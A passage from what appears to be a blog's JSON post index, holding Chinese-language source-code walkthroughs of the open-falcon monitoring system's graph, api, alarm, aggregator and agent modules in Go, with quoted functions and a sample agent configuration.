{\n\t\t\t\t\tproc.IndexUpdateIncrErrorCnt.Incr()\n\t\t\t\t} else {\n\t\t\t\t\tIndexedItemCache.Put(key, icitem)\n\t\t\t\t}\n\t\t\t}(key, icitem.(*IndexCacheItem), dbConn)\n\t\t\tret++\n\t\t}\n\t}\n\n\treturn ret\n}\n```\n\nhttp服务启动\n\n```go\nfunc Start() {\n\tif !g.Config().Http.Enabled {\n\t\tlog.Println(\"http.Start warning, not enabled\")\n\t\treturn\n\t}\n\n\tif !g.Config().Debug {\n\t\tgin.SetMode(gin.ReleaseMode)\n\t}\n\n\trouter = gin.Default()\n\n\tconfigCommonRoutes()\n\tconfigProcRoutes()\n\tconfigIndexRoutes()\n\n\trouter.GET(\"/api/v2/counter/migrate\", func(c *gin.Context) {\n\t\tcounter := rrdtool.GetCounterV2()\n\t\tlog.Debug(\"migrating counter v2:\", fmt.Sprintf(\"%+v\", counter))\n\t\tc.JSON(200, counter)\n\t})\n\n\t//compatible with open-falcon v0.1\n\trouter.GET(\"/counter/migrate\", func(c *gin.Context) {\n\t\tcnt := rrdtool.GetCounter()\n\t\tlog.Debug(\"migrating counter:\", cnt)\n\t\tc.JSON(200, gin.H{\"msg\": \"ok\", \"counter\": cnt})\n\t})\n\n\taddr := g.Config().Http.Listen\n\tif addr == \"\" {\n\t\treturn\n\t}\n\tgo router.Run(addr)\n\n\tselect {\n\tcase <-Close_chan:\n\t\tlog.Info(\"http recv sigout and exit...\")\n\t\tClose_done_chan <- 1\n\t\treturn\n\t}\n\n}\n```\n\n定时清理无效数据\n\n```go\nfunc CleanCache() {\n\n\tticker := time.NewTicker(time.Duration(g.CLEAN_CACHE) * time.Second)\n\tdefer ticker.Stop()\n\tfor {\n\t\t<-ticker.C\n\t\tDeleteInvalidItems()   // 删除无效的GraphItems\n\t\tDeleteInvalidHistory() // 删除无效的HistoryCache\n\t}\n}\n```\n\n接下来还是看下graph是如何存储数据的：\n\n接收数据函数是在handleItem函数中：\n\n```go\nfunc handleItems(items []*cmodel.GraphItem) {\n\tif items == nil {\n\t\treturn\n\t}\n\n\tcount := len(items)\n\tif count == 0 {\n\t\treturn\n\t}\n\n\tcfg := g.Config()\n\n\tfor i := 0; i < count; i++ {\n\t\tif items[i] == nil {\n\t\t\tcontinue\n\t\t}\n\n\t\tendpoint := items[i].Endpoint\n\t\tif !g.IsValidString(endpoint) {\n\t\t\tlog.Debugf(\"invalid endpoint: %s\", endpoint)\n\t\t\tpfc.Meter(\"invalidEnpoint\", 1)\n\t\t\tcontinue\n\t\t}\n\n\t\tcounter := cutils.Counter(items[i].Metric, items[i].Tags)\n\t\tif !g.IsValidString(counter) {\n\t\t\tlog.Debugf(\"invalid counter: %s/%s\", endpoint, counter)\n\t\t\tpfc.Meter(\"invalidCounter\", 1)\n\t\t\tcontinue\n\t\t}\n\n\t\tdsType := items[i].DsType\n\t\tstep := items[i].Step\n\t\tchecksum := items[i].Checksum()\n\t\tkey := g.FormRrdCacheKey(checksum, dsType, step)\n\n\t\t//statistics\n\t\tproc.GraphRpcRecvCnt.Incr()\n\n\t\t// To Graph\n\t\tfirst := store.GraphItems.First(key)\n\t\tif first != nil && items[i].Timestamp <= first.Timestamp {\n\t\t\tcontinue\n\t\t}\n        // 放入缓存队列\n\t\tstore.GraphItems.PushFront(key, items[i], checksum, cfg)\n\n\t\t// To Index\n\t\tindex.ReceiveItem(items[i], checksum)\n\n\t\t// To History\n\t\tstore.AddItem(checksum, items[i])\n\t}\n}\n```\n\n接收到数据先放到缓存队列，然后写入rrd磁盘或者写入到数据库中完成存档。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon api 源码分析","url":"/2020/01/21/api源码分析/","content":"## open-falcon api源码分析\n\n主流程在module/api/main\n\n```go\nfunc main() {\n\tconfig.BinaryName = BinaryName\n\tconfig.Version = Version\n\tconfig.GitCommit = GitCommit\n\n\tcfgTmp := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\thelp := flag.Bool(\"h\", false, \"help\")\n\tflag.Parse()\n\tcfg := *cfgTmp\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\tif *help {\n\t\tflag.Usage()\n\t\tos.Exit(0)\n\t}\n\n\tviper.AddConfigPath(\".\")\n\tviper.AddConfigPath(\"/\")\n\tviper.AddConfigPath(\"./config\")\n\tviper.AddConfigPath(\"./api/config\")\n\tcfg = strings.Replace(cfg, \".json\", \"\", 1)\n\tviper.SetConfigName(cfg)\n\n\terr := viper.ReadInConfig()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n    // 日志初始化\n\terr = config.InitLog(viper.GetString(\"log_level\"))\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n    //初始化数据\n\terr = config.InitDB(viper.GetBool(\"db.db_bug\"), viper.GetViper())\n\tif err != nil {\n\t\tlog.Fatalf(\"db conn failed with error %s\", err.Error())\n\t}\n\n\tif viper.GetString(\"log_level\") != \"debug\" {\n\t\tgin.SetMode(gin.ReleaseMode)\n\t}\n    // gin初始化\n\troutes := gin.Default()\n\tif viper.GetBool(\"gen_doc\") {\n\t\tyaag.Init(&yaag.Config{\n\t\t\tOn:       true,\n\t\t\tDocTitle: \"Gin\",\n\t\t\tDocPath:  viper.GetString(\"gen_doc_path\"),\n\t\t\tBaseUrls: map[string]string{\"Production\": \"/api/v1\", \"Staging\": \"/api/v1\"},\n\t\t})\n\t\troutes.Use(yaag_gin.Document())\n\t}\n    //启动graph服务，启动服务一致性hash\n\tinitGraph()\n\t//start gin server\n\tlog.Debugf(\"will start with port:%v\", viper.GetString(\"web_port\"))\n\tgo controller.StartGin(viper.GetString(\"web_port\"), routes)\n\n\tsigs := make(chan os.Signal, 1)\n\tsignal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n\tgo func() {\n\t\t<-sigs\n\t\tfmt.Println()\n\t\tos.Exit(0)\n\t}()\n\tselect {}\n}\n```\n\ninitGraph函数中启动graph服务\n\n```go\nfunc Start(addrs map[string]string) {\n\tclusterMap = addrs\n\tconnTimeout = int32(viper.GetInt(\"graphs.conn_timeout\"))\n\tcallTimeout = int32(viper.GetInt(\"graphs.call_timeout\"))\n\tfor c := range clusterMap {\n\t\tgcluster = append(gcluster, c)\n\t}\n\tdefer func() {\n\t\tif r := recover(); r != nil {\n\t\t\tlog.Errorf(\"graph got painc:%v\", r)\n\t\t\tStart(clusterMap)\n\t\t}\n\t}()\n\tinitNodeRings(clusterMap)  //初始化一致性hash\n\tinitConnPools(clusterMap)  //初始化rpc连接池\n\tlog.Println(\"graph.Start ok\")\n}\n```\n\n\n\nStartGin注册路由并启动：\n\n```go\nfunc StartGin(port string, r *gin.Engine) {\n\tr.Use(utils.CORS())\n\tr.GET(\"/\", func(c *gin.Context) {\n\t\tc.String(http.StatusOK, \"Hello, I'm Falcon+ (｡A｡)\")\n\t})\n\tgraph.Routes(r)\n\tuic.Routes(r)\n\ttemplate.Routes(r)\n\tstrategy.Routes(r)\n\thost.Routes(r)\n\texpression.Routes(r)\n\tmockcfg.Routes(r)\n\tdashboard_graph.Routes(r)\n\tdashboard_screen.Routes(r)\n\talarm.Routes(r)\n\tr.Run(port)\n}\n```\n\n这边api主要是在gin中注册信息，提供增删改查的功能，具体可能需要仔细去看下了。详细的这边就不描述了。\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon alarm 源码分析","url":"/2020/01/21/alarm源码分析/","content":"\n## open-falcon alarm 源码分析\n\n主函数在modules/alarm/main中\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\thelp := flag.Bool(\"h\", false, \"help\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\tif *help {\n\t\tflag.Usage()\n\t\tos.Exit(0)\n\t}\n\n\tg.ParseConfig(*cfg)\n\n\tg.InitLog(g.Config().LogLevel)\n\tif g.Config().LogLevel != \"debug\" {\n\t\tgin.SetMode(gin.ReleaseMode)\n\t}\n\t//初始化redis连接池\n\tg.InitRedisConnPool()\n    // 初始化数据库\n\tmodel.InitDatabase()\n    // 启动定时发送channel\n\tcron.InitSenderWorker()\n\t// 启动http服务\n\tgo http.Start()\n    // 定时读取highevent\n\tgo cron.ReadHighEvent()\n    // 定时读取lowevent\n\tgo cron.ReadLowEvent()\n    // 组装Mail信息，群发功能\n\tgo cron.CombineSms()\n\tgo cron.CombineMail()\n\tgo cron.CombineIM()\n    // 发送邮件功能\n\tgo cron.ConsumeIM()\n\tgo cron.ConsumeSms()\n\tgo cron.ConsumeMail()\n    // 清理过期事件\n\tgo cron.CleanExpiredEvent()\n\n\tsigs := make(chan os.Signal, 1)\n\tsignal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n\tgo func() {\n\t\t<-sigs\n\t\tfmt.Println()\n\t\tg.RedisConnPool.Close()\n\t\tos.Exit(0)\n\t}()\n\n\tselect {}\n}\n```\n\n事件读取任务以highevent为例子：\n\n```go\nfunc ReadHighEvent() {\n    // 获取优先级高的队列\n\tqueues := g.Config().Redis.HighQueues\n\tif len(queues) == 0 {\n\t\treturn\n\t}\n\n\tfor {\n        //  出队\n\t\tevent, err := popEvent(queues)\n\t\tif err != nil {\n\t\t\ttime.Sleep(time.Second)\n\t\t\tcontinue\n\t\t}\n        // 消费队列\n\t\tconsume(event, true)\n\t}\n}\n```\n\n```go\nfunc consume(event *cmodel.Event, isHigh bool) {\n\tactionId := event.ActionId()\n\tif actionId <= 0 {\n\t\treturn\n\t}\n\n\taction := api.GetAction(actionId)\n\tif action == nil {\n\t\treturn\n\t}\n\n\tif action.Callback == 1 {\n\t\tHandleCallback(event, action)\n\t}\n\n\tif isHigh {\n\t\tconsumeHighEvents(event, action)\n\t} else {\n\t\tconsumeLowEvents(event, action)\n\t}\n}\n```\n\nconsumeHighEvents函数最终会调用WriteMaiModel函数最终写入到redis队列中去：\n\n```go\nfunc WriteMailModel(mail *model.Mail) {\n\tif mail == nil {\n\t\treturn\n\t}\n\n\tbs, err := json.Marshal(mail)\n\tif err != nil {\n\t\tlog.Error(err)\n\t\treturn\n\t}\n\n\tlog.Debugf(\"write mail to queue, mail:%v, queue:%s\", mail, MAIL_QUEUE_NAME)\n\tlpush(MAIL_QUEUE_NAME, string(bs))\n}\n```\n\n```go\nfunc combineMail() {\n\tdtos := popAllMailDto()\n\tcount := len(dtos)\n\tif count == 0 {\n\t\treturn\n\t}\n\n\tdtoMap := make(map[string][]*MailDto)\n\tfor i := 0; i < count; i++ {\n\t\tkey := fmt.Sprintf(\"%d%s%s%s\", dtos[i].Priority, dtos[i].Status, dtos[i].Email, dtos[i].Metric)\n\t\tif _, ok := dtoMap[key]; ok {\n\t\t\tdtoMap[key] = append(dtoMap[key], dtos[i])\n\t\t} else {\n\t\t\tdtoMap[key] = []*MailDto{dtos[i]}\n\t\t}\n\t}\n\n\t// 不要在这处理，继续写回redis，否则重启alarm很容易丢数据\n\tfor _, arr := range dtoMap {\n\t\tsize := len(arr)\n\t\tif size == 1 {\n\t\t\tredi.WriteMail([]string{arr[0].Email}, arr[0].Subject, arr[0].Content)\n\t\t\tcontinue\n\t\t}\n\n\t\tsubject := fmt.Sprintf(\"[P%d][%s] %d %s\", arr[0].Priority, arr[0].Status, size, arr[0].Metric)\n\t\tcontentArr := make([]string, size)\n\t\tfor i := 0; i < size; i++ {\n\t\t\tcontentArr[i] = arr[i].Content\n\t\t}\n\t\tcontent := strings.Join(contentArr, \"\\r\\n\")\n\n\t\tlog.Debugf(\"combined mail subject:%s, content:%s\", subject, content)\n\t\tredi.WriteMail([]string{arr[0].Email}, subject, content)\n\t}\n}\n```\n\n设置以天为单位的过期删除事件，数据库中删除。\n\n```go\nfunc CleanExpiredEvent() {\n\tfor {\n\n\t\tretention_days := g.Config().Housekeeper.EventRetentionDays\n\t\tdelete_batch := g.Config().Housekeeper.EventDeleteBatch\n\n\t\tnow := time.Now()\n\t\tbefore := now.Add(time.Duration(-retention_days*24) * time.Hour)\n\t\teventmodel.DeleteEventOlder(before, delete_batch)\n\n\t\ttime.Sleep(time.Second * 60)\n\t}\n}\n```\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon aggregator源码分析","url":"/2020/01/21/aggregator源码分析/","content":"\n## open-falcon aggregator源码分析\n\n 主流程module/aggregator/main中：\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\thelp := flag.Bool(\"h\", false, \"help\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\tif *help {\n\t\tflag.Usage()\n\t\tos.Exit(0)\n\t}\n\t// 配置文件解析\n\tg.ParseConfig(*cfg)\n    // 数据库初始化\n\tdb.Init()\n\t// http服务启动，接口查询所有的cluster信息\n\tgo http.Start()\n    //定时更新cluster数据，并启动worker启动，用于计算平均指标数据\n\tgo cron.UpdateItems()\n\n\t// sdk configuration\n\tsender.Debug = g.Config().Debug\n\tsender.PostPushUrl = g.Config().Api.PushApi\n\n    // 数据推送\n\tsender.StartSender()\n\n\tsigs := make(chan os.Signal, 1)\n\tsignal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n\tgo func() {\n\t\t<-sigs\n\t\tfmt.Println()\n\t\tos.Exit(0)\n\t}()\n\n\tselect {}\n}\n```\n\n主要功能在UpdateItems函数中：\n\n```go\nfunc updateItems() {\n\titems, err := db.ReadClusterMonitorItems()\n\tif err != nil {\n\t\treturn\n\t}\n\n\tdeleteNoUseWorker(items)\n\tcreateWorkerIfNeed(items)\n}\n```\n\n首先查询数据库ReadClusterMonitorItems，获取已经在监控中的集群信息。，然后删除没有用到的集群信息。\n\n```go\nfunc deleteNoUseWorker(m map[string]*g.Cluster) {\n\tdel := []string{}\n\tfor key, worker := range Workers {\n\t\tif _, ok := m[key]; !ok {\n\t\t\tworker.Drop()\n\t\t\tdel = append(del, key)\n\t\t}\n\t}\n\n\tfor _, key := range del {\n\t\tdelete(Workers, key)\n\t}\n}\n```\n\n如果还没有监控则创建worker任务：\n\n```go\nfunc createWorkerIfNeed(m map[string]*g.Cluster) {\n\tfor key, item := range m {\n\t\tif _, ok := Workers[key]; !ok {\n\t\t\tif item.Step <= 0 {\n\t\t\t\tlog.Println(\"[W] invalid cluster(step <= 0):\", item)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tworker := NewWorker(item)\n\t\t\tWorkers[key] = worker\n\t\t\tworker.Start() // 启动\n\t\t}\n\t}\n}\n```\n\n```go\nfunc (this Worker) Start() {\n\tgo func() {\n\t\ts1 := rand.NewSource(time.Now().UnixNano() * this.ClusterItem.Id)\n\t\tr1 := rand.New(s1)\n\t\t// 60s, step usually\n\t\tdelay := r1.Int63n(60000)\n\t\tif g.Config().Debug {\n\t\t\tlog.Printf(\"[I] after %5d ms, start worker %d\", delay, this.ClusterItem.Id)\n\t\t}\n\n\t\ttime.Sleep(time.Duration(delay) * time.Millisecond)\n\t\tthis.Ticker = time.NewTicker(time.Duration(this.ClusterItem.Step) * time.Second)\n\n\t\tfor {\n\t\t\tselect {\n\t\t\tcase <-this.Ticker.C:\n\t\t\t\tWorkerRun(this.ClusterItem)\n\t\t\tcase <-this.Quit:\n\t\t\t\tif g.Config().Debug {\n\t\t\t\t\tlog.Println(\"[I] drop worker\", this.ClusterItem)\n\t\t\t\t}\n\t\t\t\tthis.Ticker.Stop()\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t}()\n}\n```\n\n设置定时器执行函数WorkerRun\n\n```go\nfunc WorkerRun(item *g.Cluster) {\n\tdebug := g.Config().Debug\n\n\tnumeratorStr := cleanParam(item.Numerator)        //\n\tdenominatorStr := cleanParam(item.Denominator)\n\n\tif !expressionValid(numeratorStr) || !expressionValid(denominatorStr) {\n\t\tlog.Println(\"[W] invalid numerator or denominator\", item)\n\t\treturn\n\t}\n    // 判断包含$(需要解析\n\tneedComputeNumerator := needCompute(numeratorStr)\n\tneedComputeDenominator := needCompute(denominatorStr)\n\n\tif !needComputeNumerator && !needComputeDenominator {\n\t\tlog.Println(\"[W] no need compute\", item)\n\t\treturn\n\t}\n\n    // 解析算子\n\tnumeratorOperands, numeratorOperators, numeratorComputeMode := parse(numeratorStr, needComputeNumerator)\n\tdenominatorOperands, denominatorOperators, denominatorComputeMode := parse(denominatorStr, needComputeDenominator)\n\n    // 操作非法\n\tif !operatorsValid(numeratorOperators) || !operatorsValid(denominatorOperators) {\n\t\tlog.Println(\"[W] operators invalid\", item)\n\t\treturn\n\t}\n\t// 根据id获取hostname\n\thostnames, err := sdk.HostnamesByID(item.GroupId)\n\tif err != nil || len(hostnames) == 0 {\n\t\treturn\n\t}\n\n\tnow := time.Now().Unix()\n\t// 获取最新的数据点\n\tvalueMap, err := queryCounterLast(numeratorOperands, denominatorOperands, hostnames, now-int64(item.Step*2), now)\n\tif err != nil {\n\t\tlog.Println(\"[E]\", err, item)\n\t\treturn\n\t}\n\n\tvar numerator, denominator float64\n\tvar validCount int\n\t// 每个机器计算\n\tfor _, hostname := range hostnames {\n\t\tvar numeratorVal, denominatorVal float64\n\t\tvar err error\n\t\t// 需要计算分子\n\t\tif needComputeNumerator {\n\t\t\tnumeratorVal, err = compute(numeratorOperands, numeratorOperators, numeratorComputeMode, hostname, valueMap)\n\n\t\t\tif debug && err != nil {\n\t\t\t\tlog.Printf(\"[W] [hostname:%s] [numerator:%s] id:%d, err:%v\", hostname, item.Numerator, item.Id, err)\n\t\t\t} else if debug {\n\t\t\t\tlog.Printf(\"[D] [hostname:%s] [numerator:%s] id:%d, value:%0.4f\", hostname, item.Numerator, item.Id, numeratorVal)\n\t\t\t}\n\n\t\t\tif err != nil {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t}\n\t\t// 需要计算分母\n\t\tif needComputeDenominator {\n\t\t\tdenominatorVal, err = compute(denominatorOperands, denominatorOperators, denominatorComputeMode, hostname, valueMap)\n\n\t\t\tif debug && err != nil {\n\t\t\t\tlog.Printf(\"[W] [hostname:%s] [denominator:%s] id:%d, err:%v\", hostname, item.Denominator, item.Id, err)\n\t\t\t} else if debug {\n\t\t\t\tlog.Printf(\"[D] [hostname:%s] [denominator:%s] id:%d, value:%0.4f\", hostname, item.Denominator, item.Id, denominatorVal)\n\t\t\t}\n\n\t\t\tif err != nil {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t}\n\n\t\tif debug {\n\t\t\tlog.Printf(\"[D] hostname:%s  numerator:%0.4f  denominator:%0.4f  per:%0.4f\\n\", hostname, numeratorVal, denominatorVal, numeratorVal/denominatorVal)\n\t\t}\n\t\tnumerator += numeratorVal\n\t\tdenominator += denominatorVal\n\t\tvalidCount += 1\n\t}\n\t// 不需要要计算分子\n\tif !needComputeNumerator {\n\t\tif numeratorStr == \"$#\" {\n\t\t\tnumerator = float64(validCount)\n\t\t} else {\n\t\t\tnumerator, err = strconv.ParseFloat(numeratorStr, 64)\n\t\t\tif err != nil {\n\t\t\t\tlog.Printf(\"[E] strconv.ParseFloat(%s) fail %v, id:%d\", numeratorStr, err, item.Id)\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t}\n\t// 不需要计算分母\n\tif !needComputeDenominator {\n\t\tif denominatorStr == \"$#\" {\n\t\t\tdenominator = float64(validCount)\n\t\t} else {\n\t\t\tdenominator, err = strconv.ParseFloat(denominatorStr, 64)\n\t\t\tif err != nil {\n\t\t\t\tlog.Printf(\"[E] strconv.ParseFloat(%s) fail %v, id:%d\", denominatorStr, err, item.Id)\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t}\n\n\tif denominator == 0 {\n\t\tlog.Println(\"[W] denominator == 0, id:\", item.Id)\n\t\treturn\n\t}\n\n\tif validCount == 0 {\n\t\tlog.Println(\"[W] validCount == 0, id:\", item.Id)\n\t\treturn\n\t}\n\n\tif debug {\n\t\tlog.Printf(\"[D] hostname:all  numerator:%0.4f  denominator:%0.4f  per:%0.4f\\n\", numerator, denominator, numerator/denominator)\n\t}\n    // sender push推送集群数据，给agent节点推送数据，数据传输通过/v1/push转发到transfer,这个地方需要注意的！！！\n\tsender.Push(item.Endpoint, item.Metric, item.Tags, numerator/denominator, item.DsType, int64(item.Step))\n}\n```\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon agent源码分析","url":"/2020/01/21/agent源码分析/","content":"\n## open-falcon agent源码分析\n\n因为工作需要，将这个open-falcon代码逻辑需要整理清楚。有些部分需要定制修改。\n\n本篇文章主要是针对open-falcon 中agent模块进行分析。\n\n主流程再module/agent/module中\n\n```go\nfunc main() {\n\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tcheck := flag.Bool(\"check\", false, \"check collector\")\n\t//解析参数\n\tflag.Parse()\n\t\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\tif *check {\n        // 检查当前系统磁盘cpu等信息，有问题就退出\n\t\tfuncs.CheckCollector()\n\t\tos.Exit(0)\n\t}\n\t//解析配置文件\n\tg.ParseConfig(*cfg)\n\n\tif g.Config().Debug {\n\t\tg.InitLog(\"debug\")\n\t} else {\n\t\tg.InitLog(\"info\")\n\t}\n\t// 初始化root目录\n\tg.InitRootDir()\n    // localip初始化其实就是检查hbs服务是否启动能够连接。同时根据hbs来获取本地ip\n\tg.InitLocalIp()\n    // 初始化rpc客户端\n\tg.InitRpcClients()\n\t// 构建需要抓取的指标数据\n\tfuncs.BuildMappers()\n\t// 定时更新cpu和disk状态历史数据\n\tgo cron.InitDataHistory()\n\t// 定时给hbs报告agent本机状态\n\tcron.ReportAgentStatus()\n    //同步插件，没咋用过\n\tcron.SyncMinePlugins()\n    //调用hbs rpc接口BuiltinMetrics来获取BuiltinMetrics数据。同步监控端口、路径、进程和URL\n\tcron.SyncBuiltinMetrics()\n    //定时检查信任ip\n\tcron.SyncTrustableIps()\n    //定时收集指标数据\n\tcron.Collect()\n\t//启动http接口方便查询\n\tgo http.Start()\n\n\tselect {}\n\n}\n```\n\n先来看下配置文件：\n\n```json\n{\n    \"debug\": true,\n    \"hostname\": \"\",         \n    \"ip\": \"\",\n    \"plugin\": {               # 插件\n        \"enabled\": false,\n        \"dir\": \"./plugin\",\n        \"git\": \"https://github.com/open-falcon/plugin.git\",\n        \"logs\": \"./logs\"\n    },\n    \"heartbeat\": {            # 心跳\n        \"enabled\": true,\n        \"addr\": \"127.0.0.1:6030\",\n        \"interval\": 60,\n        \"timeout\": 1000\n    },\n    \"transfer\": {             # 传输地址\n        \"enabled\": true,\n        \"addrs\": [\n            \"127.0.0.1:8433\",\n            \"127.0.0.1:8433\"\n        ],\n        \"interval\": 60,\n        \"timeout\": 1000\n    },\n    \"http\": {                # http\n        \"enabled\": true,\n        \"listen\": \":1988\",\n        \"backdoor\": false\n    },\n    \"collector\": {          # 收集接口数据\n        \"ifacePrefix\": [\"eth\", \"em\"],\n        \"mountPoint\": []\n    },\n    \"default_tags\": {\n    },\n    \"ignore\": {                    \n        \"cpu.busy\": true,\n        \"df.bytes.free\": true,\n        \"df.bytes.total\": true,\n        \"df.bytes.used\": true,\n        \"df.bytes.used.percent\": true,\n        \"df.inodes.total\": true,\n        \"df.inodes.free\": true,\n        \"df.inodes.used\": true,\n        \"df.inodes.used.percent\": true,\n        \"mem.memtotal\": true,\n        \"mem.memused\": true,\n        \"mem.memused.percent\": true,\n        \"mem.memfree\": true,\n        \"mem.swaptotal\": true,\n        \"mem.swapused\": true,\n        \"mem.swapfree\": true\n    }\n}\n\n```\n\n先来看看InitRootDir函数，主要获取了根目录，为了后续启动http拼接路径。\n\n```go\nfunc InitRootDir() {\n\tvar err error\n\tRoot, err = os.Getwd()\n\tif err != nil {\n\t\tlog.Fatalln(\"getwd fail:\", err)\n\t}\n}\n```\n\n获取函数InitLocalIp，该函数获取hbs连接。获取本地localip地址，主要为了能够后续给hbs发送心跳报告。\n\n```go\nfunc InitLocalIp() {\n\tif Config().Heartbeat.Enabled {\n\t\tconn, err := net.DialTimeout(\"tcp\", Config().Heartbeat.Addr, time.Second*10)\n\t\tif err != nil {\n\t\t\tlog.Println(\"get local addr failed !\")\n\t\t} else {\n\t\t\tLocalIp = strings.Split(conn.LocalAddr().String(), \":\")[0]\n\t\t\tconn.Close()\n\t\t}\n\t} else {\n\t\tlog.Println(\"hearbeat is not enabled, can't get localip\")\n\t}\n}\n```\n\n初始化hbs的rpc客户端连接：\n\n```go\nfunc InitRpcClients() {\n\tif Config().Heartbeat.Enabled {\n\t\tHbsClient = &SingleConnRpcClient{\n\t\t\tRpcServer: Config().Heartbeat.Addr,\n\t\t\tTimeout:   time.Duration(Config().Heartbeat.Timeout) * time.Millisecond,\n\t\t}\n\t}\n}\n```\n\n函数BuildMappers，构建指标函数，类似于将所有的指标函数注册到map中去。\n\n```go\nfunc BuildMappers() {\n\tinterval := g.Config().Transfer.Interval\n\tMappers = []FuncsAndInterval{\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tAgentMetrics,\n\t\t\t\tCpuMetrics,\n\t\t\t\tNetMetrics,\n\t\t\t\tKernelMetrics,\n\t\t\t\tLoadAvgMetrics,\n\t\t\t\tMemMetrics,\n\t\t\t\tDiskIOMetrics,\n\t\t\t\tIOStatsMetrics,\n\t\t\t\tNetstatMetrics,\n\t\t\t\tProcMetrics,\n\t\t\t\tUdpMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tDeviceMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tPortMetrics,\n\t\t\t\tSocketStatSummaryMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tDuMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tUrlMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tGpuMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t}\n}\n```\n\n函数InitDataHistory：\n\n```go\nfunc InitDataHistory() {\n\tfor {\n\t\tfuncs.UpdateCpuStat()  //更新cpu状态信息   方便后续统计的时候用到了。\n\t\tfuncs.UpdateDiskStats()  // 更新disk状态信息\n\t\ttime.Sleep(g.COLLECT_INTERVAL)  // 间隔\n\t}\n}\n```\n\n函数reportAgentStatus函数：\n\n```go\nfunc ReportAgentStatus() {\n\tif g.Config().Heartbeat.Enabled && g.Config().Heartbeat.Addr != \"\" {\n\t\tgo reportAgentStatus(time.Duration(g.Config().Heartbeat.Interval) * time.Second)\n\t}\n}\n```\n\nReportAgentStatus函数调用reportAgentStatus函数来类似做了一层公共方法转私有分封装：\n\n```go\nfunc reportAgentStatus(interval time.Duration) {\n\tfor {\n\t\thostname, err := g.Hostname()\n\t\tif err != nil {\n\t\t\thostname = fmt.Sprintf(\"error:%s\", err.Error())\n\t\t}\n\n\t\treq := model.AgentReportRequest{\n\t\t\tHostname:      hostname,\n\t\t\tIP:            g.IP(),\n\t\t\tAgentVersion:  g.VersionMsg(),\n\t\t\tPluginVersion: g.GetCurrPluginVersion(),\n\t\t}\n\n\t\tvar resp model.SimpleRpcResponse\n        // 调用hbs rpc接口reportStatus上传当前agent状态信息，问题如果agent节点挂了，那么后续可能是通过mock数据去检查了\n\t\terr = g.HbsClient.Call(\"Agent.ReportStatus\", req, &resp)\n\t\tif err != nil || resp.Code != 0 {\n\t\t\tlog.Println(\"call Agent.ReportStatus fail:\", err, \"Request:\", req, \"Response:\", resp)\n\t\t}\n\n\t\ttime.Sleep(interval)\n\t}\n}\n```\n\n类似的SyncMinPlugins函数：\n\n```go\nfunc SyncMinePlugins() {\n\tif !g.Config().Plugin.Enabled {\n\t\treturn\n\t}\n\n\tif !g.Config().Heartbeat.Enabled {\n\t\treturn\n\t}\n\n\tif g.Config().Heartbeat.Addr == \"\" {\n\t\treturn\n\t}\n\n\tgo syncMinePlugins()\n}\n```\n\n调用函数syncMinePlugins：\n\n```go\nfunc syncMinePlugins() {\n\n\tvar (\n\t\ttimestamp  int64 = -1\n\t\tpluginDirs []string\n\t)\n\n\tduration := time.Duration(g.Config().Heartbeat.Interval) * time.Second\n\n\tfor {\n\t\ttime.Sleep(duration)\n\n\t\thostname, err := g.Hostname()\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\t\t\n\t\treq := 